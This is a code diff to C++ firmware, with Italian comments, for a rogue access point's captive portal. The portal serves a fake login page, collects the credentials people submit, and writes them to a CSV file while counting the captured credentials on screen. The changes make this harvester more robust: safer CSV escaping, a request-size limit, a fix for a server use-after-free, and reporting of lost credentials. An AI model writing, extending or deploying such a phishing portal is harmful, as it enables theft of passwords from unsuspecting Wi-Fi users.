@@ -8,6 +8,7 @@
 
 #include <cstdio>
 #include <cstring>
+#include <new>
 #include <string>
 
 #include "Display.h"
@@ -72,6 +73,7 @@ volatile uint32_t g_dropped = 0;
 volatile uint32_t g_writeErrors = 0;
 
 std::string g_html;
+AsyncWebServer* g_server = nullptr;
 
 void copyField(char* destination, size_t size, const String& value) {
     size_t length = value.length();
@@ -117,17 +119,24 @@ void enqueueCredential(AsyncWebServerRequest* request) {
 }
 
 std::string csvField(const char* value) {
-    std::string out = "\"";
-    bool first = true;
+    // Le virgolette proteggono ';' e virgole: si normalizzano solo CR/LF.
+    // L'apostrofo iniziale evita l'interpretazione come formula anche quando
+    // il valore comincia con spazi/tab seguiti da = + - @.
+    std::string out;
+    const char* firstSignificant = value;
+    while (*firstSignificant == ' ' || *firstSignificant == '\t') {
+        ++firstSignificant;
+    }
+    const bool formulaLike =
+        *firstSignificant == '=' || *firstSignificant == '+' ||
+        *firstSignificant == '-' || *firstSignificant == '@';
+    out.push_back('"');
+    if (formulaLike) {
+        out.push_back('\'');
+    }
     for (const char* p = value; *p != '\0'; ++p) {
         const char c = *p;
-        // Blocca l'interpretazione come formula se il file viene aperto in un
-        // foglio di calcolo (i campi sono comunque tra virgolette).
-        if (first && (c == '=' || c == '+' || c == '-' || c == '@')) {
-            out.push_back('\'');
-        }
-        first = false;
-        if (c == '\r' || c == '\n' || c == ';') {
+        if (c == '\r' || c == '\n') {
             out.push_back(' ');
         } else if (c == '"') {
             out += "\"\"";
@@ -182,11 +191,14 @@ void drawPortal(const std::string& ip, bool dnsOk) {
                   "Client " + std::to_string(WiFi.softAPgetStationNum()) +
                       "   Richieste " + std::to_string(g_requests),
                   display::kText, 0);
-    display::text(8, 74,
-                  "Credenziali " + std::to_string(g_saved) + "   in coda " +
-                      std::to_string((g_queueHead - g_queueTail + kQueueSize) %
-                                     kQueueSize),
-                  display::kText, 0);
+    std::string credLine = "Credenziali " + std::to_string(g_saved) + "  coda " +
+                           std::to_string((g_queueHead - g_queueTail + kQueueSize) %
+                                          kQueueSize);
+    if (g_dropped > 0) {
+        credLine += "  perse " + std::to_string(g_dropped);
+    }
+    display::text(8, 74, credLine, g_dropped > 0 ? display::kWarning : display::kText,
+                  0);
     display::text(8, 88, "File: /wifiext/portal.csv", display::kTextDim, 0);
     if (!dnsOk) {
         display::text(8, 100, "!DNS captive non attivo", display::kWarning, 0);
@@ -210,8 +222,33 @@ void handlePortalPage(AsyncWebServerRequest* request) {
 
 void handleLogin(AsyncWebServerRequest* request) {
     countRequest();
+    // Limite esplicito: un AP aperto non deve poter far accumulare form enormi.
+    if (request->contentLength() > 1024) {
+        request->send(413, "text/plain", "Richiesta troppo grande");
+        return;
+    }
     enqueueCredential(request);
     request->send(200, "text/html", kSuccessHtml);
+}
+
+// Il server resta allocato per tutta la vita del firmware: AsyncWebServer::end()
+// non attende i callback gia' in esecuzione, quindi distruggerlo (o liberare
+// g_html) all'uscita sarebbe un use-after-free.
+bool ensureServer() {
+    if (g_server != nullptr) {
+        return true;
+    }
+    g_server = new (std::nothrow) AsyncWebServer(80);
+    if (g_server == nullptr) {
+        return false;
+    }
+    g_server->on("/", HTTP_GET, handlePortalPage);
+    g_server->on("/login", HTTP_POST, handleLogin);
+    g_server->onNotFound([](AsyncWebServerRequest* request) {
+        countRequest();
+        request->send(200, "text/html", g_html.c_str());
+    });
+    return true;
 }
 
 }  // namespace
@@ -233,6 +270,10 @@ void runAutoPortal() {
     }
 
     ensureDir();
+    if (!ensureServer()) {
+        ui::message("Auto-Portal", {"Memoria insufficiente per il server HTTP."}, "WiFi+");
+        return;
+    }
     g_html.clear();
     if (!storage::readText(kHtmlPath, g_html, 16384, true) || g_html.empty()) {
         g_html = kFallbackHtml;
@@ -261,13 +302,7 @@ void runAutoPortal() {
         logger::warn("Auto-Portal: DNS captive non avviato");
     }
 
-    AsyncWebServer server(80);
-    server.on("/", HTTP_GET, handlePortalPage);
-    server.on("/login", HTTP_POST, handleLogin);
-    server.onNotFound([](AsyncWebServerRequest* request) {
-        countRequest();
-        request->send(200, "text/html", g_html.c_str());
-    });
+    AsyncWebServer& server = *g_server;
     server.begin();
 
     logger::info("Auto-Portal avviato su %s", ip.toString().c_str());
@@ -294,13 +329,19 @@ void runAutoPortal() {
 
     drainQueue();
     server.end();
+    // Attesa limitata: AsyncWebServer::end() chiude solo il listening socket,
+    // non sincronizza i callback del task AsyncTCP. g_server e g_html restano
+    // allocati (riusati al prossimo avvio), quindi nessun use-after-free.
+    const uint32_t graceStart = millis();
+    while (millis() - graceStart < 250) {
+        delay(5);
+    }
+    drainQueue();
     if (dnsOk) {
         dns.stop();
     }
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_OFF);
-    g_html.clear();
-    g_html.shrink_to_fit();
     logger::info("Auto-Portal fermato: %u richieste, %u credenziali, %u perse",
                  static_cast<unsigned>(g_requests), static_cast<unsigned>(g_saved),
                  static_cast<unsigned>(g_dropped));
